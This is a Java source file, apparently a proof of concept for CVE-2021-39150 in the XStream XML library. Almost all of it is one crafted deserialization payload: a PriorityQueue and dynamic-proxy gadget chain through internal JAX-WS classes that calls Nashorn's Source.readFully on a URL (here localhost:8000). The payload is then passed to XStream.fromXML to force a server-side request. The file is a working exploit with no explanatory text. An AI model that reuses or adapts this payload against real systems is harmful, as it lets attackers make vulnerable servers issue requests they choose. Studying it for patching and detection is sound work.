package com.r17a.xstream.cve.priorityqueue;

import com.thoughtworks.xstream.XStream;

public class CVE_2021_39150 {
    public static void main(String[] args) {
        String xml = "<java.util.PriorityQueue serialization='custom'>\n" +
                "  <unserializable-parents/>\n" +
                "  <java.util.PriorityQueue>\n" +
                "    <default>\n" +
                "      <size>2</size>\n" +
                "    </default>\n" +
                "    <int>3</int>\n" +
                "    <dynamic-proxy>\n" +
                "      <interface>java.lang.Comparable</interface>\n" +
                "      <handler class='com.sun.xml.internal.ws.client.sei.SEIStub'>\n" +
                "        <owner/>\n" +
                "        <managedObjectManagerClosed>false</managedObjectManagerClosed>\n" +
                "        <databinding class='com.sun.xml.internal.ws.db.DatabindingImpl'>\n" +
                "          <stubHandlers>\n" +
                "            <entry>\n" +
                "              <method>\n" +
                "                <class>java.lang.Comparable</class>\n" +
                "                <name>compareTo</name>\n" +
                "                <parameter-types>\n" +
                "                  <class>java.lang.Object</class>\n" +
                "                </parameter-types>\n" +
                "              </method>\n" +
                "              <com.sun.xml.internal.ws.client.sei.StubHandler>\n" +
                "                <bodyBuilder class='com.sun.xml.internal.ws.client.sei.BodyBuilder$DocLit'>\n" +
                "                  <indices>\n" +
                "                    <int>0</int>\n" +
                "                  </indices>\n" +
                "                  <getters>\n" +
                "                    <com.sun.xml.internal.ws.client.sei.ValueGetter>PLAIN</com.sun.xml.internal.ws.client.sei.ValueGetter>\n" +
                "                  </getters>\n" +
                "                  <accessors>\n" +
                "                    <com.sun.xml.internal.ws.spi.db.JAXBWrapperAccessor_-2>\n" +
                "                      <val_-isJAXBElement>false</val_-isJAXBElement>\n" +
                "                      <val_-getter class='com.sun.xml.internal.ws.spi.db.FieldGetter'>\n" +
                "                        <type>int</type>\n" +
                "                        <field>\n" +
                "                          <name>hash</name>\n" +
                "                          <clazz>java.lang.String</clazz>\n" +
                "                        </field>\n" +
                "                      </val_-getter>\n" +
                "                      <val_-isListType>false</val_-isListType>\n" +
                "                      <val_-n>\n" +
                "                        <namespaceURI/>\n" +
                "                        <localPart>hash</localPart>\n" +
                "                        <prefix/>\n" +
                "                      </val_-n>\n" +
                "                      <val_-setter class='com.sun.xml.internal.ws.spi.db.MethodSetter'>\n" +
                "                        <type>java.lang.String</type>\n" +
                "                        <method>\n" +
                "                          <class>jdk.nashorn.internal.runtime.Source</class>\n" +
                "                          <name>readFully</name>\n" +
                "                          <parameter-types>\n" +
                "                            <class>java.net.URL</class>\n" +
                "                          </parameter-types>\n" +
                "                        </method>\n" +
                "                      </val_-setter>\n" +
                "                      <outer-class>\n" +
                "                        <propertySetters>\n" +
                "                          <entry>\n" +
                "                            <string>serialPersistentFields</string>\n" +
                "                            <com.sun.xml.internal.ws.spi.db.FieldSetter>\n" +
                "                              <type>[Ljava.io.ObjectStreamField;</type>\n" +
                "                              <field>\n" +
                "                                <name>serialPersistentFields</name>\n" +
                "                                <clazz>java.lang.String</clazz>\n" +
                "                              </field>\n" +
                "                            </com.sun.xml.internal.ws.spi.db.FieldSetter>\n" +
                "                          </entry>\n" +
                "                          <entry>\n" +
                "                            <string>CASE_INSENSITIVE_ORDER</string>\n" +
                "                            <com.sun.xml.internal.ws.spi.db.FieldSetter>\n" +
                "                              <type>java.util.Comparator</type>\n" +
                "                              <field>\n" +
                "                                <name>CASE_INSENSITIVE_ORDER</name>\n" +
                "                                <clazz>java.lang.String</clazz>\n" +
                "                              </field>\n" +
                "                            </com.sun.xml.internal.ws.spi.db.FieldSetter>\n" +
                "                          </entry>\n" +
                "                          <entry>\n" +
                "                            <string>serialVersionUID</string>\n" +
                "                            <com.sun.xml.internal.ws.spi.db.FieldSetter>\n" +
                "                              <type>long</type>\n" +
                "                              <field>\n" +
                "                                <name>serialVersionUID</name>\n" +
                "                                <clazz>java.lang.String</clazz>\n" +
                "                              </field>\n" +
                "                            </com.sun.xml.internal.ws.spi.db.FieldSetter>\n" +
                "                          </entry>\n" +
                "                          <entry>\n" +
                "                            <string>value</string>\n" +
                "                            <com.sun.xml.internal.ws.spi.db.FieldSetter>\n" +
                "                              <type>[C</type>\n" +
                "                              <field>\n" +
                "                                <name>value</name>\n" +
                "                                <clazz>java.lang.String</clazz>\n" +
                "                              </field>\n" +
                "                            </com.sun.xml.internal.ws.spi.db.FieldSetter>\n" +
                "                          </entry>\n" +
                "                          <entry>\n" +
                "                            <string>hash</string>\n" +
                "                            <com.sun.xml.internal.ws.spi.db.FieldSetter>\n" +
                "                              <type>int</type>\n" +
                "                              <field reference='../../../../../val_-getter/field'/>\n" +
                "                            </com.sun.xml.internal.ws.spi.db.FieldSetter>\n" +
                "                          </entry>\n" +
                "                        </propertySetters>\n" +
                "                        <propertyGetters>\n" +
                "                          <entry>\n" +
                "                            <string>serialPersistentFields</string>\n" +
                "                            <com.sun.xml.internal.ws.spi.db.FieldGetter>\n" +
                "                              <type>[Ljava.io.ObjectStreamField;</type>\n" +
                "                              <field reference='../../../../propertySetters/entry/com.sun.xml.internal.ws.spi.db.FieldSetter/field'/>\n" +
                "                            </com.sun.xml.internal.ws.spi.db.FieldGetter>\n" +
                "                          </entry>\n" +
                "                          <entry>\n" +
                "                            <string>CASE_INSENSITIVE_ORDER</string>\n" +
                "                            <com.sun.xml.internal.ws.spi.db.FieldGetter>\n" +
                "                              <type>java.util.Comparator</type>\n" +
                "                              <field reference='../../../../propertySetters/entry[2]/com.sun.xml.internal.ws.spi.db.FieldSetter/field'/>\n" +
                "                            </com.sun.xml.internal.ws.spi.db.FieldGetter>\n" +
                "                          </entry>\n" +
                "                          <entry>\n" +
                "                            <string>serialVersionUID</string>\n" +
                "                            <com.sun.xml.internal.ws.spi.db.FieldGetter>\n" +
                "                              <type>long</type>\n" +
                "                              <field reference='../../../../propertySetters/entry[3]/com.sun.xml.internal.ws.spi.db.FieldSetter/field'/>\n" +
                "                            </com.sun.xml.internal.ws.spi.db.FieldGetter>\n" +
                "                          </entry>\n" +
                "                          <entry>\n" +
                "                            <string>value</string>\n" +
                "                            <com.sun.xml.internal.ws.spi.db.FieldGetter>\n" +
                "                              <type>[C</type>\n" +
                "                              <field reference='../../../../propertySetters/entry[4]/com.sun.xml.internal.ws.spi.db.FieldSetter/field'/>\n" +
                "                            </com.sun.xml.internal.ws.spi.db.FieldGetter>\n" +
                "                          </entry>\n" +
                "                          <entry>\n" +
                "                            <string>hash</string>\n" +
                "                            <com.sun.xml.internal.ws.spi.db.FieldGetter reference='../../../../val_-getter'/>\n" +
                "                          </entry>\n" +
                "                        </propertyGetters>\n" +
                "                        <elementLocalNameCollision>false</elementLocalNameCollision>\n" +
                "                        <contentClass>java.lang.String</contentClass>\n" +
                "                        <elementDeclaredTypes/>\n" +
                "                      </outer-class>\n" +
                "                    </com.sun.xml.internal.ws.spi.db.JAXBWrapperAccessor_-2>\n" +
                "                  </accessors>\n" +
                "                  <wrapper>java.lang.Object</wrapper>\n" +
                "                  <bindingContext class='com.sun.xml.internal.ws.db.glassfish.JAXBRIContextWrapper'/>\n" +
                "                  <dynamicWrapper>false</dynamicWrapper>\n" +
                "                </bodyBuilder>\n" +
                "                <isOneWay>false</isOneWay>\n" +
                "              </com.sun.xml.internal.ws.client.sei.StubHandler>\n" +
                "            </entry>\n" +
                "          </stubHandlers>\n" +
                "          <clientConfig>false</clientConfig>\n" +
                "        </databinding>\n" +
                "        <methodHandlers>\n" +
                "          <entry>\n" +
                "            <method reference='../../../databinding/stubHandlers/entry/method'/>\n" +
                "            <com.sun.xml.internal.ws.client.sei.SyncMethodHandler>\n" +
                "              <owner reference='../../../..'/>\n" +
                "              <method reference='../../../../databinding/stubHandlers/entry/method'/>\n" +
                "              <isVoid>false</isVoid>\n" +
                "              <isOneway>false</isOneway>\n" +
                "            </com.sun.xml.internal.ws.client.sei.SyncMethodHandler>\n" +
                "          </entry>\n" +
                "        </methodHandlers>\n" +
                "      </handler>\n" +
                "    </dynamic-proxy>\n" +
                "    <url>http://localhost:8000/</url>\n" +
                "  </java.util.PriorityQueue>\n" +
                "</java.util.PriorityQueue>";
        XStream xstream = new XStream();
        xstream.fromXML(xml);

    }
}
